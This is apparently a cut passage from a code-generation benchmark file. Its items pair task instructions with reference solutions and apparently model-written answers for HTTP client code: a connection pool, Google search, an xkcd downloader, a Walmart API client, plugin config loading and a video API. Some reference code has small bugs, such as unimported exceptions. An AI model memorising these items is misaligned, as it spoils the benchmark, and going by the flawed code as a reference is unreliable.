None, maxsize: int = 1, block: bool = False, headers: Optional[Mapping[str, str]] = None, retries: Union[Retry, bool, int, None] = None, _proxy: Optional[Url] = None, _proxy_headers: Optional[Mapping[str, str]] = None, **conn_kw: Any) -> None - Initializes the connection pool with given configuration\n- _new_conn() -> HTTPConnection - Creates a new connection instance\n- _get_conn(timeout: Optional[float] = None) -> HTTPConnection - Retrieves a connection from the pool or creates a new one\n- _put_conn(conn: Optional[HTTPConnection]) -> None - Returns a connection to the pool\n- _make_request(conn: HTTPConnection, method: str, url: str, body: Optional[Any] = None, headers: Optional[Mapping[str, str]] = None, retries: Optional[Retry] = None, timeout: Union[Timeout, float, None] = None, **response_kw: Any) -> BaseHTTPResponse - Makes an HTTP request using the given connection\n- urlopen(method: str, url: str, body: Optional[Any] = None, headers: Optional[Mapping[str, str]] = None, retries: Optional[Retry] = None, redirect: bool = True, assert_same_host: bool = True, timeout: Union[Timeout, float, None] = None, pool_timeout: Optional[int] = None, **response_kw: Any) -> BaseHTTPResponse - Main method to execute HTTP requests using pooled connections\n- _close_pool_connections(pool: queue.LifoQueue) -> None - Closes all connections in the pool\n- close() -> None - Closes the connection pool and all its connections",
    "Canonical_solution": "from socket import timeout as SocketTimeout\nfrom types import TracebackType\nfrom typing import Any, Mapping, Optional, Union\nimport queue\nimport weakref\nfrom .connection import HTTPConnection, HTTPSConnection\nfrom .exceptions import (\n    ClosedPoolError,\n    EmptyPoolError,\n    FullPoolError,\n    HostChangedError,\n    LocationValueError,\n    MaxRetryError,\n    NewConnectionError,\n    ProtocolError,\n    ProxyError,\n    ReadTimeoutError,\n    SSLError,\n    TimeoutError,\n)\nfrom .response import BaseHTTPResponse\nfrom .util.connection import is_connection_dropped\nfrom .util.proxy import connection_requires_http_tunnel\nfrom .util.retry import Retry\nfrom .util.timeout import Timeout\nfrom .util.url import Url, parse_url\nfrom .util.util import to_str\n\nclass HTTPConnectionPool:\n    scheme = \"http\"\n    ConnectionCls = HTTPConnection\n    QueueCls = queue.LifoQueue\n\n    def __init__(\n        self,\n        host: str,\n        port: Optional[int] = None,\n        timeout: Union[Timeout, float, None] = None,\n        maxsize: int = 1,\n        block: bool = False,\n        headers: Optional[Mapping[str, str]] = None,\n        retries: Union[Retry, bool, int, None] = None,\n        _proxy: Optional[Url] = None,\n        _proxy_headers: Optional[Mapping[str, str]] = None,\n        **conn_kw: Any,\n    ):\n        if not host:\n            raise LocationValueError(\"No host specified.\")\n\n        self.host = host\n        self.port = port\n        self.timeout = Timeout.from_float(timeout) if not isinstance(timeout, Timeout) else timeout\n        self.retries = retries if retries is not None else Retry.DEFAULT\n        self.pool = self.QueueCls(maxsize)\n        self.block = block\n        self.proxy = _proxy\n        self.proxy_headers = _proxy_headers or {}\n        self.headers = headers or {}\n        self.conn_kw = conn_kw\n\n        for _ in range(maxsize):\n            self.pool.put(None)\n\n        weakref.finalize(self, self._close_pool_connections, self.pool)\n\n    def _new_conn(self) -> HTTPConnection:\n        return self.ConnectionCls(\n            host=self.host,\n            port=self.port,\n            timeout=self.timeout.connect_timeout,\n            **self.conn_kw,\n        )\n\n    def _get_conn(self, timeout: Optional[float] = None) -> HTTPConnection:\n        try:\n            conn = self.pool.get(block=self.block, timeout=timeout)\n        except queue.Empty:\n            if self.block:\n                raise EmptyPoolError(self, \"Pool is empty and blocking is enabled.\")\n            conn = self._new_conn()\n\n        if conn and is_connection_dropped(conn):\n            conn.close()\n            conn = self._new_conn()\n\n        return conn or self._new_conn()\n\n    def _put_conn(self, conn: Optional[HTTPConnection]) -> None:\n        try:\n            self.pool.put(conn, block=False)\n        except queue.Full:\n            if conn:\n                conn.close()\n\n    def _make_request(\n        self,\n        conn: HTTPConnection,\n        method: str,\n        url: str,\n        body: Optional[Any] = None,\n        headers: Optional[Mapping[str, str]] = None,\n        retries: Optional[Retry] = None,\n        timeout: Union[Timeout, float, None] = None,\n        **response_kw: Any,\n    ) -> BaseHTTPResponse:\n        timeout_obj = self.timeout if timeout is None else Timeout.from_float(timeout)\n        \n        try:\n            conn.request(\n                method,\n                url,\n                body=body,\n                headers=headers,\n            )\n            response = conn.getresponse()\n            response._pool = self\n            return response\n        except (SocketTimeout, BaseSSLError, OSError) as e:\n            conn.close()\n            raise\n\n    def urlopen(\n        self,\n        method: str,\n        url: str,\n        body: Optional[Any] = None,\n        headers: Optional[Mapping[str, str]] = None,\n        retries: Optional[Retry] = None,\n        redirect: bool = True,\n        assert_same_host: bool = True,\n        timeout: Union[Timeout, float, None] = None,\n        pool_timeout: Optional[int] = None,\n        **response_kw: Any,\n    ) -> BaseHTTPResponse:\n        conn = None\n        try:\n            conn = self._get_conn(timeout=pool_timeout)\n            response = self._make_request(\n                conn,\n                method,\n                url,\n                body=body,\n                headers=headers,\n                retries=retries,\n                timeout=timeout,\n                **response_kw,\n            )\n            return response\n        except (EmptyPoolError, MaxRetryError, HostChangedError) as e:\n            raise\n        except (TimeoutError, HTTPException, OSError) as e:\n            if conn:\n                conn.close()\n            raise\n        finally:\n            if conn:\n                self._put_conn(conn)\n\n    def _close_pool_connections(self, pool: queue.LifoQueue) -> None:\n        try:\n            while True:\n                conn = pool.get(block=False)\n                if conn:\n                    conn.close()\n        except queue.Empty:\n            pass\n\n    def close(self) -> None:\n        if self.pool:\n            self._close_pool_connections(self.pool)\n            self.pool = None",
    "Code_level": "Class-level",
    "FSMID_for_test": 56,
    "right_result": "import queue\nfrom typing import Optional, Union, Mapping, Any, Type\nfrom urllib3.connection import HTTPConnection, HTTPSConnection\nfrom urllib3.response import BaseHTTPResponse\nfrom urllib3.util import Timeout\nfrom urllib3.exceptions import MaxRetryError, ProxyError\nfrom urllib3.poolmanager import PoolManager\nfrom urllib3.request import RequestMethods\nfrom dataclasses import dataclass\n\n@dataclass\nclass Retry:\n    total: int = 3\n    backoff_factor: float = 0.5\n\nclass Url:\n    def __init__(self, host: str, port: Optional[int] = None, scheme: str = \"http\"):\n        self.host = host\n        self.port = port\n        self.scheme = scheme\n\nclass HTTPConnectionPool(RequestMethods):\n    scheme = \"http\"\n    ConnectionCls = HTTPConnection\n    QueueCls = queue.LifoQueue\n\n    def __init__(\n        self,\n        host: str,\n        port: Optional[int] = None,\n        timeout: Union[Timeout, float, None] = None,\n        maxsize: int = 1,\n        block: bool = False,\n        headers: Optional[Mapping[str, str]] = None,\n        retries: Union[Retry, bool, int, None] = None,\n        _proxy: Optional[Url] = None,\n        _proxy_headers: Optional[Mapping[str, str]] = None,\n        **conn_kw: Any\n    ) -> None:\n        self.host = host\n        self.port = port\n        self.timeout = timeout\n        self.retries = retries if isinstance(retries, (Retry, type(None))) else Retry(total=retries)\n        self.pool = self.QueueCls(maxsize)\n        self.block = block\n        self.proxy = _proxy\n        self.proxy_headers = _proxy_headers\n        self.headers = headers or {}\n        self.conn_kw = conn_kw\n        self.scheme = _proxy.scheme if _proxy else \"http\"\n        self.ConnectionCls = HTTPConnection if self.scheme == \"http\" else HTTPSConnection\n\n    def _new_conn(self) -> HTTPConnection:\n        return self.ConnectionCls(\n            host=self.host,\n            port=self.port,\n            timeout=self.timeout,\n            proxy=self.proxy,\n            proxy_headers=self.proxy_headers,\n            **self.conn_kw\n        )\n\n    def _get_conn(self, timeout: Optional[float] = None) -> HTTPConnection:\n        try:\n            conn = self.pool.get(block=self.block, timeout=timeout)\n        except queue.Empty:\n            conn = self._new_conn()\n        return conn\n\n    def _put_conn(self, conn: Optional[HTTPConnection]) -> None:\n        if conn and conn.is_usable():\n            try:\n                self.pool.put(conn, block=False)\n            except queue.Full:\n                conn.close()\n\n    def _make_request(\n        self,\n        conn: HTTPConnection,\n        method: str,\n        url: str,\n        body: Optional[Any] = None,\n        headers: Optional[Mapping[str, str]] = None,\n        retries: Optional[Retry] = None,\n        timeout: Union[Timeout, float, None] = None,\n        **response_kw: Any\n    ) -> BaseHTTPResponse:\n        retries = retries or self.retries or Retry()\n        retry_count = 0\n        while True:\n            try:\n                conn.request(method, url, body=body, headers=headers or {})\n                response = conn.getresponse()\n                return response\n            except Exception as e:\n                retry_count += 1\n                if retry_count > retries.total:\n                    raise MaxRetryError(pool=self, url=url, reason=e)\n                conn = self._new_conn()\n\n    def urlopen(\n        self,\n        method: str,\n        url: str,\n        body: Optional[Any] = None,\n        headers: Optional[Mapping[str, str]] = None,\n        retries: Optional[Retry] = None,\n        redirect: bool = True,\n        assert_same_host: bool = True,\n        timeout: Union[Timeout, float, None] = None,\n        pool_timeout: Optional[int] = None,\n        **response_kw: Any\n    ) -> BaseHTTPResponse:\n        conn = self._get_conn(timeout=pool_timeout)\n        try:\n            response = self._make_request(conn, method, url, body, headers, retries, timeout, **response_kw)\n            return response\n        finally:\n            self._put_conn(conn)\n\n    def _close_pool_connections(self, pool: queue.LifoQueue) -> None:\n        while True:\n            try:\n                conn = pool.get(block=False)\n                conn.close()\n            except queue.Empty:\n                break\n\n    def close(self) -> None:\n        self._close_pool_connections(self.pool)"
  },
  {
    "Task_id": 65,
    "Instruction": "Task Description: Implement a function to perform web searches using Google's Custom Search JSON API, handling both regular web searches and image searches, with proper error handling and response processing.\n\nFunction Description: The function performs a web search using Google's Custom Search API, constructs the appropriate API request based on search type, processes the response, and returns formatted results. It handles API keys, pagination, and different search types (web/image).\n\nInput:\n- keywords: (str or list) - Search terms as either a string or list of strings\n- paper_num: (int, optional) - Page number for paginated results (default=1)\n\nOutput:\n- Returns either:\n  - A formatted string containing search results (snippets and URLs) with date information\n  - An error message if the request fails (either HTTP error or exception)\n  - A message suggesting to check next page if no results found\n\nThe function also prints debug information including status code and response body to stdout.",
    "Canonical_solution": "import json\nfrom datetime import date\nimport requests\nfrom ..config import config_path, load_api_keys\n\napi_keys = load_api_keys(config_path)\ng_api_key = api_keys.get(\"google_api_key\")\ng_CSE_ID = api_keys.get(\"CSE_ID\")\ng_searchType = \"web\"\n\ndef search_web(keywords, paper_num=1):\n    if paper_num == \"\":\n        paper_num = 1\n    today = str(date.today())\n    global g_api_key, g_CSE_ID, g_searchType\n    num_results = 10\n    start = num_results * (int(paper_num) - 1) + 1\n    try:\n        base_url = \"https://www.googleapis.com/customsearch/v1\"\n        if g_searchType == \"image\":\n            params = {\n                \"key\": g_api_key,\n                \"cx\": g_CSE_ID,\n                \"num\": num_results,\n                \"q\": keywords if isinstance(keywords, str) else \" \".join(keywords),\n                \"start\": start,\n                \"searchType\": g_searchType,\n            }\n        else:\n            params = {\n                \"key\": g_api_key,\n                \"cx\": g_CSE_ID,\n                \"num\": num_results,\n                \"q\": keywords if isinstance(keywords, str) else \" \".join(keywords),\n                \"start\": start,\n            }\n\n        response = requests.get(base_url, params=params, timeout=10)\n        print(\"Status code:\", response.status_code)\n        print(\"Response body:\", response.text)\n\n        data = response.json()\n        all_content = \"\"\n        if response.status_code == 200:\n            data = response.json()\n            if \"items\" in data:\n                for item in data[\"items\"]:\n                    keyword = item[\"snippet\"]\n                    url = item[\"link\"]\n                    all_content += \"/n/n\" + json.dumps({\"snippet\": keyword, \"link\": url}, ensure_ascii=False, indent=4)\n\n        else:\n            return f\"Error: {response.status_code} - {response.text}\"\n\n    except Exception as e:\n        return f\"Exception occurred: {e}\"\n\n    print(all_content)\n    return (\n        \"\u4eca\u5929\u7684\u65e5\u671f\u662f\"\n        + today\n        + \"\uff0c\u5f53\u524d\u7f51\u7edc\u7684\u4fe1\u606f\u548c\u4fe1\u606f\u6765\u6e90\u7684\u7f51\u5740\u4e3a\uff1a\u201c\"\n        + str(all_content)\n        + \"\u201d\u3002/n\u5982\u679c\u4ee5\u4e0a\u4fe1\u606f\u4e2d\u6ca1\u6709\u76f8\u5173\u4fe1\u606f\uff0c\u4f60\u53ef\u4ee5\u6539\u53d8paper_num\uff0c\u67e5\u770b\u4e0b\u4e00\u9875\u7684\u4fe1\u606f\u3002\"\n    )",
    "Code_level": "Function-level",
    "FSMID_for_test": 57,
    "right_result": "import os\nimport requests\nfrom urllib.parse import quote_plus\n\ndef google_custom_search(keywords, paper_num=1):\n    API_KEY = os.getenv(\"GOOGLE_API_KEY\")\n    SEARCH_ENGINE_ID = os.getenv(\"SEARCH_ENGINE_ID\")\n\n    if not API_KEY or not SEARCH_ENGINE_ID:\n        print(\"Error: Missing API key or Search Engine ID\")\n        return \"Error: Missing API key or Search Engine ID\"\n\n    if isinstance(keywords, list):\n        keywords = ' '.join(keywords)\n\n    search_type = \"images\" if \"img\" in keywords.lower() else \"\"\n    start_index = (paper_num - 1) * 10 + 1\n    encoded_query = quote_plus(keywords)\n\n    url = f\"https://www.googleapis.com/customsearch/v1?key={API_KEY}&cx={SEARCH_ENGINE_ID}&q={encoded_query}&start={start_index}\"\n    if search_type:\n        url += \"&searchType=image\"\n\n    try:\n        response = requests.get(url)\n        print(f\"Status Code: {response.status_code}\")\n        print(f\"Response Body: {response.text}\")\n\n        if response.status_code != 200:\n            return f\"HTTP Error: {response.status_code} - {response.reason}\"\n\n        results = response.json().get(\"items\")\n        if not results:\n            return f\"No results found. Try checking the next page (page {paper_num + 1})\"\n\n        output = []\n        for i, item in enumerate(results, 1):\n            title = item.get(\"title\", \"No title\")\n            link = item.get(\"link\", \"No link\")\n            snippet = item.get(\"snippet\", \"No snippet available\")\n            date = item.get(\"pagemap\", {}).get(\"metatags\", [{}])[0].get(\"article:published_time\", \"Date not available\")\n\n            if search_type:\n                output.append(f\"{i}. [{title}]({link})\\n   Image result - Date: {date}\")\n            else:\n                output.append(f\"{i}. [{title}]({link})\\n   {snippet}\\n   Date: {date}\")\n\n        return \"\\n\\n\".join(output)\n\n    except requests.RequestException as e:\n        print(f\"Request Exception: {e}\")\n        return f\"Search request failed: {str(e)}\"\n    except Exception as e:\n        print(f\"Unexpected error: {e}\")\n        return f\"An unexpected error occurred: {str(e)}\""
  },
  {
    "Task_id": 68,
    "Instruction": "Task Description: Download a comic image from the xkcd website given a specific issue number.\n\nFunction Description: The function downloads an image from the xkcd comic website by first fetching the webpage of the specified issue number, parsing the HTML to extract the image URL, and then downloading the image to the local filesystem. It handles HTTP requests and responses, checks for success status codes, and saves the image using streaming to avoid memory issues with large files.\n\nInput: \n- issue_number: [str] - The issue number of the comic to download (e.g., \"1234\"). This is appended to the base xkcd URL to form the full webpage URL.\n\nOutput: \n- [str] - A success message indicating the downloaded image filename if successful, or an error message if the request fails or the issue number is invalid.",
    "Canonical_solution": "import requests\nfrom bs4 import BeautifulSoup as bs\nimport shutil\n\ndef download_comic_image(issue_number):\n    url = \"https://xkcd.com/\"+ issue_number\n    response = requests.get(url)\n\n    if response.status_code == 200:\n        soup = bs(response.content, 'html.parser')\n        image_link = soup.find_all('img')[2]['src']\n        image_name = image_link.split('/')[-1]\n        image_url = \"https:\" + image_link\n        r = requests.get(image_url, stream=True)\n        \n        if r.status_code == 200:\n            r.raw.decode_content = True\n            with open(image_name, 'wb') as f:\n                shutil.copyfileobj(r.raw, f)\n            return f'Image successfully Downloaded: {image_name}'\n        else:\n            return 'Image Couldn\\'t be retrieved'\n    else:\n        return \"Issue number is invalid\"",
    "Code_level": "Function-level",
    "FSMID_for_test": 57,
    "right_result": "import requests\nfrom bs4 import BeautifulSoup\nimport os\n\ndef download_xkcd_comic(issue_number):\n    base_url = \"https://xkcd.com/\"\n    image_base_url = \"https://imgs.xkcd.com/comics/\"\n\n    url = base_url + issue_number\n    response = requests.get(url)\n    \n    if response.status_code != 200:\n        return f\"Failed to retrieve comic {issue_number}: HTTP status code {response.status_code}\"\n\n    soup = BeautifulSoup(response.text, 'html.parser')\n    img_tag = soup.find('img', {'src': lambda x: x and x.startswith('/comics/')})\n\n    if not img_tag:\n        return f\"No image found for comic {issue_number}\"\n\n    img_url = image_base_url + img_tag['src'].split('/')[-1]\n    img_response = requests.get(img_url, stream=True)\n\n    if img_response.status_code != 200:\n        return f\"Failed to download image for comic {issue_number}: HTTP status code {img_response.status_code}\"\n\n    filename = os.path.join(os.getcwd(), img_url.split('/')[-1])\n    with open(filename, 'wb') as file:\n        for chunk in img_response.iter_content(chunk_size=1024):\n            if chunk:\n                file.write(chunk)\n\n    return f\"Downloaded image: {filename}\""
  },
  {
    "Task_id": 69,
    "Instruction": "Task Description: Create a Python class to interact with the Walmart Marketplace API, handling authentication, order management, and inventory operations.\n\nClass Description: The WalmartAPI class provides methods to authenticate with and interact with the Walmart Marketplace API. It supports user verification, order retrieval and acknowledgment, as well as inventory management operations.\n\nAttributes:\napi_key: str - Walmart API key for authentication\naccess_token: str - Access token for API authorization\nmarketplace_id: str - Marketplace identifier for API requests\n\nMethods:\nverify_user: verify_user() -> None - Verifies the current access token corresponds to a valid user. Raises exception if verification fails.\nget_orders: get_orders(status: str, start_date: Optional[datetime], end_date: Optional[datetime], limit: int) -> List[Dict] - Retrieves orders from Walmart Marketplace with optional filters for status, date range, and limit.\nacknowledge_order: acknowledge_order(purchase_order_id: str) -> str - Acknowledges a specific order by purchase order ID.\nget_inventory: get_inventory(sku_list: List[str]) -> List[Dict] - Gets inventory levels for specified SKUs or all inventory if no SKUs provided.\nupdate_inventory: update_inventory(sku: str, quantity: int) -> str - Updates inventory quantity for a specific SKU.",
    "Canonical_solution": "import os\nimport logging\nimport requests\nfrom datetime import datetime, timedelta\nfrom typing import List, Dict, Optional\n\nclass WalmartAPI:\n    def __init__(self, api_key: str = None, access_token: str = None, marketplace_id: str = None):\n        self.api_key = api_key\n        self.access_token = access_token\n        self.marketplace_id = marketplace_id\n\n    def verify_user(self):\n        \"\"\"\n        Verifies that the current access token corresponds to a valid user.\n        If verification fails, raises an exception.\n        \"\"\"\n        logging.info(f\"Verifying user with token: {self.access_token}\")\n        headers = {\n            \"WM_SEC.ACCESS_TOKEN\": self.access_token,\n            \"WM_SVC.NAME\": \"Walmart Marketplace\",\n            \"WM_QOS.CORRELATION_ID\": self.marketplace_id,\n            \"Accept\": \"application/json\",\n        }\n\n        response = requests.get(\n            \"https://marketplace.walmartapis.com/v3/seller/info\", headers=headers\n        )\n\n        if response.status_code != 200:\n            raise Exception(\n                f\"User verification failed. Status: {response.status_code}, \"\n                f\"Response: {response.text}\"\n            )\n\n    async def get_orders(\n        self,\n        status: str = \"Created\",\n        start_date: Optional[datetime] = None,\n        end_date: Optional[datetime] = None,\n        limit: int = 100,\n    ) -> List[Dict]:\n        \"\"\"\n        Retrieves orders from Walmart Marketplace.\n        \"\"\"\n        try:\n            self.verify_user()\n\n            if not start_date:\n                start_date = datetime.now() - timedelta(days=7)\n            if not end_date:\n                end_date = datetime.now()\n\n            headers = {\n                \"WM_SEC.ACCESS_TOKEN\": self.access_token,\n                \"WM_SVC.NAME\": \"Walmart Marketplace\",\n                \"WM_QOS.CORRELATION_ID\": self.marketplace_id,\n                \"Accept\": \"application/json\",\n            }\n\n            params = {\n                \"status\": status,\n                \"createdStartDate\": start_date.isoformat(),\n                \"createdEndDate\": end_date.isoformat(),\n                \"limit\": limit,\n            }\n\n            response = requests.get(\n                \"https://marketplace.walmartapis.com/v3/orders\",\n                headers=headers,\n                params=params,\n            )\n\n            if response.status_code != 200:\n                raise Exception(f\"Failed to fetch orders: {response.text}\")\n\n            return response.json().get(\"elements\", [])\n\n        except Exception as e:\n            logging.error(f\"Error retrieving orders: {str(e)}\")\n            return []\n\n    async def acknowledge_order(self, purchase_order_id: str) -> str:\n        \"\"\"\n        Acknowledges a Walmart Marketplace order.\n        \"\"\"\n        try:\n            self.verify_user()\n\n            headers = {\n                \"WM_SEC.ACCESS_TOKEN\": self.access_token,\n                \"WM_SVC.NAME\": \"Walmart Marketplace\",\n                \"WM_QOS.CORRELATION_ID\": self.marketplace_id,\n                \"Content-Type\": \"application/json\",\n            }\n\n            response = requests.post(\n                f\"https://marketplace.walmartapis.com/v3/orders/{purchase_order_id}/acknowledge\",\n                headers=headers,\n            )\n\n            if response.status_code == 204:\n                return \"Order acknowledged successfully.\"\n            else:\n                raise Exception(f\"Failed to acknowledge order: {response.text}\")\n\n        except Exception as e:\n            logging.error(f\"Error acknowledging order: {str(e)}\")\n            return f\"Failed to acknowledge order: {str(e)}\"\n\n    async def get_inventory(self, sku_list: List[str] = None) -> List[Dict]:\n        \"\"\"\n        Gets inventory levels for specified SKUs.\n        \"\"\"\n        try:\n            self.verify_user()\n\n            headers = {\n                \"WM_SEC.ACCESS_TOKEN\": self.access_token,\n                \"WM_SVC.NAME\": \"Walmart Marketplace\",\n                \"WM_QOS.CORRELATION_ID\": self.marketplace_id,\n                \"Accept\": \"application/json\",\n            }\n\n            params = {}\n            if sku_list:\n                params[\"sku\"] = \",\".join(sku_list)\n\n            response = requests.get(\n                \"https://marketplace.walmartapis.com/v3/inventory\",\n                headers=headers,\n                params=params,\n            )\n\n            if response.status_code != 200:\n                raise Exception(f\"Failed to fetch inventory: {response.text}\")\n\n            return response.json().get(\"elements\", [])\n\n        except Exception as e:\n            logging.error(f\"Error retrieving inventory: {str(e)}\")\n            return []\n\n    async def update_inventory(self, sku: str, quantity: int) -> str:\n        \"\"\"\n        Updates inventory quantity for a specific SKU.\n        \"\"\"\n        try:\n            self.verify_user()\n\n            headers = {\n                \"WM_SEC.ACCESS_TOKEN\": self.access_token,\n                \"WM_SVC.NAME\": \"Walmart Marketplace\",\n                \"WM_QOS.CORRELATION_ID\": self.marketplace_id,\n                \"Content-Type\": \"application/json\",\n            }\n\n            data = {\"sku\": sku, \"quantity\": {\"unit\": \"EACH\", \"amount\": quantity}}\n\n            response = requests.put(\n                f\"https://marketplace.walmartapis.com/v3/inventory\",\n                headers=headers,\n                json=data,\n            )\n\n            if response.status_code == 200:\n                return \"Inventory updated successfully.\"\n            else:\n                raise Exception(f\"Failed to update inventory: {response.text}\")\n\n        except Exception as e:\n            logging.error(f\"Error updating inventory: {str(e)}\")\n            return f\"Failed to update inventory: {str(e)}\"",
    "Code_level": "Class-level",
    "FSMID_for_test": 57,
    "right_result": "import requests\nfrom datetime import datetime\nfrom typing import Optional, List, Dict\n\n\nclass WalmartAPI:\n    def __init__(self, api_key: str, access_token: str, marketplace_id: str):\n        self.api_key = api_key\n        self.access_token = access_token\n        self.marketplace_id = marketplace_id\n        self.base_url = \"https://marketplace.walmartapis.com/v3\"\n\n    def verify_user(self) -> None:\n        headers = {\n            \"Authorization\": f\"Bearer {self.access_token}\",\n            \"WM_SVC.NAME\": \"Walmart Marketplace\",\n            \"WM_SEC.ACCESS_TOKEN\": self.access_token,\n            \"Accept\": \"application/json\"\n        }\n        response = requests.get(f\"{self.base_url}/user\", headers=headers)\n        if response.status_code != 200:\n            raise Exception(\"User verification failed\")\n\n    def get_orders(self, status: str, start_date: Optional[datetime] = None, end_date: Optional[datetime] = None, limit: int = 20) -> List[Dict]:\n        headers = {\n            \"Authorization\": f\"Bearer {self.access_token}\",\n            \"WM_SVC.NAME\": \"Walmart Marketplace\",\n            \"WM_SEC.ACCESS_TOKEN\": self.access_token,\n            \"Accept\": \"application/json\"\n        }\n        params = {\"status\": status, \"limit\": limit}\n        if start_date:\n            params[\"createdStartDate\"] = start_date.isoformat()\n        if end_date:\n            params[\"createdEndDate\"] = end_date.isoformat()\n        response = requests.get(f\"{self.base_url}/orders\", headers=headers, params=params)\n        if response.status_code == 200:\n            return response.json().get(\"list\", [])\n        else:\n            raise Exception(f\"Failed to retrieve orders: {response.text}\")\n\n    def acknowledge_order(self, purchase_order_id: str) -> str:\n        headers = {\n            \"Authorization\": f\"Bearer {self.access_token}\",\n            \"WM_SVC.NAME\": \"Walmart Marketplace\",\n            \"WM_SEC.ACCESS_TOKEN\": self.access_token,\n            \"Content-Type\": \"application/json\"\n        }\n        url = f\"{self.base_url}/orders/{purchase_order_id}/acknowledge\"\n        response = requests.post(url, headers=headers)\n        if response.status_code == 200:\n            return response.json().get(\"acknowledgmentStatus\", \"Unknown\")\n        else:\n            raise Exception(f\"Failed to acknowledge order: {response.text}\")\n\n    def get_inventory(self, sku_list: List[str] = None) -> List[Dict]:\n        headers = {\n            \"Authorization\": f\"Bearer {self.access_token}\",\n            \"WM_SVC.NAME\": \"Walmart Marketplace\",\n            \"WM_SEC.ACCESS_TOKEN\": self.access_token,\n            \"Accept\": \"application/json\"\n        }\n        if sku_list:\n            params = {\"sku\": \",\".join(sku_list)}\n            response = requests.get(f\"{self.base_url}/inventory\", headers=headers, params=params)\n        else:\n            response = requests.get(f\"{self.base_url}/inventory\", headers=headers)\n        if response.status_code == 200:\n            return response.json().get(\"inventory\", [])\n        else:\n            raise Exception(f\"Failed to retrieve inventory: {response.text}\")\n\n    def update_inventory(self, sku: str, quantity: int) -> str:\n        headers = {\n            \"Authorization\": f\"Bearer {self.access_token}\",\n            \"WM_SVC.NAME\": \"Walmart Marketplace\",\n            \"WM_SEC.ACCESS_TOKEN\": self.access_token,\n            \"Content-Type\": \"application/json\"\n        }\n        data = {\n            \"sku\": sku,\n            \"quantity\": quantity\n        }\n        response = requests.put(f\"{self.base_url}/inventory\", headers=headers, json=data)\n        if response.status_code == 200:\n            return response.json().get(\"updateTime\", \"Unknown\")\n        else:\n            raise Exception(f\"Failed to update inventory: {response.text}\")"
  },
  {
    "Task_id": 70,
    "Instruction": "Task Description: Implement a function to load and validate tool configurations from remote URLs by making HTTP requests and processing the responses.\n\nFunction Description: The function `load_valid_tools` takes a dictionary of tool mappings and attempts to fetch each tool's configuration from a remote server. It constructs URLs by appending \".well-known/ai-plugin.json\" to each base URL in the input dictionary. For each successful HTTP GET request (status code 200), it parses the JSON response and adds it to the output dictionary. Failed requests are logged as warnings.\n\nInput: \n- tools_mappings: [dict] - A dictionary where keys are tool identifiers and values are base URLs for the tools' configuration endpoints.\n\nOutput: \n- tools_to_config: [dict] - A dictionary where keys are the same as the input dictionary, and values are the parsed JSON configurations from successful requests. Tools with failed requests are excluded.",
    "Canonical_solution": "import requests\nimport os\nfrom bmtools import get_logger\n\nlogger = get_logger(__name__)\n\ndef load_valid_tools(tools_mappings):\n    tools_to_config = {}\n    for key in tools_mappings:\n        get_url = tools_mappings[key]+\".well-known/ai-plugin.json\"\n        \n        response = requests.get(get_url)\n\n        if response.status_code == 200:\n            tools_to_config[key] = response.json()\n        else:\n            logger.warning(\"Load tool {} error, status code {}\".format(key, response.status_code))\n\n    return tools_to_config",
    "Code_level": "Function-level",
    "FSMID_for_test": 57,
    "right_result": "import requests\nimport json\nimport warnings\n\ndef load_valid_tools(tools_mappings):\n    tools_to_config = {}\n    for tool_id, base_url in tools_mappings.items():\n        config_url = f\"{base_url.rstrip('/')}/.well-known/ai-plugin.json\"\n        try:\n            response = requests.get(config_url)\n            if response.status_code == 200:\n                try:\n                    config = response.json()\n                    tools_to_config[tool_id] = config\n                except json.JSONDecodeError:\n                    warnings.warn(f\"Failed to decode JSON for {tool_id} from {config_url}\")\n            else:\n                warnings.warn(f\"HTTP error {response.status_code} for {tool_id} from {config_url}\")\n        except requests.RequestException as e:\n            warnings.warn(f\"Request failed for {tool_id} from {config_url}: {e}\")\n    return tools_to_config"
  },
  {
    "Task_id": 73,
    "Instruction": "Task Description: Implement HTTP client functions to interact with the Augie video creation API, including creating videos and checking their status.\n\nFunction Description: The first function creates a video on the Augie platform by sending a POST request with the provided parameters. The second function checks the status of a video creation process by sending a GET request with the video ID.\n\nInput: \n1. For create_augie: \n   - params: dict - A dictionary containing video creation parameters (e.g., script, voice settings, etc.)\n2. For get_augie_status: \n   - augie_id: str - The unique identifier of the Augie video to check\n\nOutput:\n1. For create_augie: \n   - dict - The API response containing video creation details if successful (status code 201)\n   - Exception - If the request fails (status code other than 201)\n2. For get_augie_status: \n   - dict - A status dictionary with either {\"status\": \"completed\", \"video_url\": [url]} or {\"status\": \"processing\"}\n   - Exception - If the request fails (status code other than 200)",
    "Canonical_solution": "@func.register_function(\n  metadata={\"description\": \"Creates a video on Augie platform.\"},\n  key_dependencies=[\"augie_api_key\"],\n  imports={\"name\": \"requests\", \"lib\": \"requests\"}\n)\ndef create_augie(params):\n  \"\"\"Function to create a video on Augie platform with parameters.\"\"\"\n  API_KEY = globals()['augie_api_key']\n  BASE_URL = 'https://beta.api.augie.studio/v1'\n\n  headers = {\n      'x-api-key': API_KEY,\n      'Content-Type': 'application/json'\n  }\n\n  import requests\n  response = requests.post(f'{BASE_URL}/augies', json=params, headers=headers)\n\n  if response.status_code == 201:\n      return response.json()  # Returns the creation response\n  else:\n      raise Exception(f\"Failed to create Augie: {response.text}\")\n\n\n@func.register_function(\n  metadata={\"description\": \"Checks the status of the created video.\"},\n  key_dependencies=[\"augie_api_key\"],\n  imports={\"name\": \"requests\", \"lib\": \"requests\"}\n)\ndef get_augie_status(augie_id):\n  \"\"\"Function to check the status of an Augie video creation.\"\"\"\n  API_KEY = globals()['augie_api_key']\n  BASE_URL = 'https://beta.api.augie.studio/v1'\n\n  headers = {\n      'x-api-key': API_KEY\n  }\n\n  import requests\n  response = requests.get(f'{BASE_URL}/augies/{augie_id}/status', headers=headers)\n\n  if response.status_code == 200:\n      status_data = response.json()\n      if status_data.get('status') == 'succeeded' and 'output' in status_data and 'video' in status_data['output']:\n          return {\"status\": \"completed\", \"video_url\": status_data['output']['video']}\n      else:\n          return {\"status\": \"processing\"}\n  else:\n      raise Exception(f\"Failed to get Augie status: {response.text}\")",
    "Code_level": "Function-level",
    "FSMID_for_test": 57,
